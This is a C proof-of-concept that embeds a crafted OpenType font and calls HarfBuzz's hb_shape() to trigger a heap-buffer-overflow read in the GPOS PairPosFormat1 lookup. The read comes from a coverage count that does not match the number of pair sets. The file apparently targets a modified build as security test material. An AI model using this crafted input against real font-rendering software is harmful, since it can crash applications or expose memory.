/*
 * PoC for a heap-buffer-overflow in OT::Layout::GPOS_impl::PairPosFormat1_3
 * (src/OT/Layout/GPOS/PairPosFormat1.hh), reachable through the public
 * hb_shape() API with an in-contract (sanitizer-accepted) OpenType font.
 *
 * The crafted font's GPOS table has a PairPosFormat1 subtable whose
 * Coverage table lists two glyphs (population == 2) while its pairSet
 * array declares only one PairSet entry (pairSetCount == 1). Nothing in
 * hb_sanitize_context_t cross-checks that these two counts agree, so this
 * is accepted as a well-formed (if unusual) table.
 *
 * The lookup's external digest cache allocates `pair_sets[]` sized to
 * pairSet.len (1 entry) but PairPosFormat1_3::apply() guards access to it
 * with a bound derived from the coverage population (2) instead, so
 * shaping a buffer whose current glyph is the *second* coverage entry
 * reads one hb_set_digest_t past the end of the heap allocation.
 *
 * Builds with the project headers only (hb.h), drives hb_shape() with
 * custom hb_font_funcs_t (to supply glyph ids without needing a cmap/glyf
 * table), and aborts under AddressSanitizer only on the modified tree.
 */
#include <hb.h>
#include <stdio.h>

static const unsigned char kFontData[] = {
79, 84, 84, 79, 0, 5, 0, 64, 0, 2, 0, 16, 71, 80, 79, 83,
0, 0, 0, 0, 0, 0, 0, 92, 0, 0, 0, 80, 104, 101, 97, 100,
0, 0, 0, 0, 0, 0, 0, 172, 0, 0, 0, 56, 104, 104, 101, 97,
0, 0, 0, 0, 0, 0, 0, 228, 0, 0, 0, 36, 104, 109, 116, 120,
0, 0, 0, 0, 0, 0, 1, 8, 0, 0, 0, 16, 109, 97, 120, 112,
0, 0, 0, 0, 0, 0, 1, 24, 0, 0, 0, 8, 0, 1, 0, 0,
0, 10, 0, 30, 0, 44, 0, 1, 68, 70, 76, 84, 0, 8, 0, 4,
0, 0, 0, 0, 255, 255, 0, 1, 0, 0, 0, 1, 107, 101, 114, 110,
0, 8, 0, 0, 0, 1, 0, 0, 0, 1, 0, 4, 0, 2, 0, 0,
0, 1, 0, 8, 0, 1, 0, 12, 0, 0, 0, 0, 0, 1, 0, 20,
0, 1, 0, 2, 0, 1, 0, 2, 0, 1, 0, 3, 0, 1, 0, 0,
0, 1, 0, 0, 0, 0, 0, 0, 95, 15, 60, 245, 0, 0, 3, 232,
0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 2, 0, 0,
0, 0, 0, 0, 0, 1, 0, 0, 3, 32, 255, 56, 0, 0, 1, 244,
0, 0, 0, 0, 1, 244, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0,
0, 0, 0, 0, 0, 0, 0, 4, 1, 244, 0, 0, 1, 244, 0, 0,
1, 244, 0, 0, 1, 244, 0, 0, 0, 0, 80, 0, 0, 4, 0, 0,
};
static const unsigned kFontDataLen = 288;

/* GID_A=1 has a PairSet entry; GID_B=2 is coverage index 1 (population=2,
 * but pairSetCount==1 in the crafted table); GID_C=3 is an arbitrary
 * second glyph for the pair. */
#define GID_B 2
#define GID_C 3

static hb_bool_t
nominal_glyph_func (hb_font_t *font, void *font_data,
                     hb_codepoint_t unicode, hb_codepoint_t *glyph,
                     void *user_data)
{
  switch (unicode)
  {
    case 0x41: *glyph = GID_B; return 1; /* 'A' -> GID_B (coverage idx 1) */
    case 0x42: *glyph = GID_C; return 1; /* 'B' -> GID_C */
    default: return 0;
  }
}

static hb_position_t
h_advance_func (hb_font_t *font, void *font_data,
                hb_codepoint_t glyph, void *user_data)
{
  return 500;
}

int
main (void)
{
  hb_blob_t *blob = hb_blob_create ((const char *) kFontData, kFontDataLen,
                                     HB_MEMORY_MODE_READONLY, NULL, NULL);
  hb_face_t *face = hb_face_create (blob, 0);
  hb_blob_destroy (blob);

  hb_font_t *font = hb_font_create (face);
  hb_face_destroy (face);

  hb_font_funcs_t *ffuncs = hb_font_funcs_create ();
  hb_font_funcs_set_nominal_glyph_func (ffuncs, nominal_glyph_func, NULL, NULL);
  hb_font_funcs_set_glyph_h_advance_func (ffuncs, h_advance_func, NULL, NULL);
  hb_font_set_funcs (font, ffuncs, NULL, NULL);
  hb_font_funcs_destroy (ffuncs);

  hb_font_set_scale (font, 1000, 1000);

  hb_buffer_t *buf = hb_buffer_create ();
  hb_buffer_add_utf8 (buf, "AB", -1, 0, -1);
  hb_buffer_guess_segment_properties (buf);

  hb_shape (font, buf, NULL, 0);

  printf ("shaped %u glyphs\n", hb_buffer_get_length (buf));

  hb_buffer_destroy (buf);
  hb_font_destroy (font);
  return 0;
}
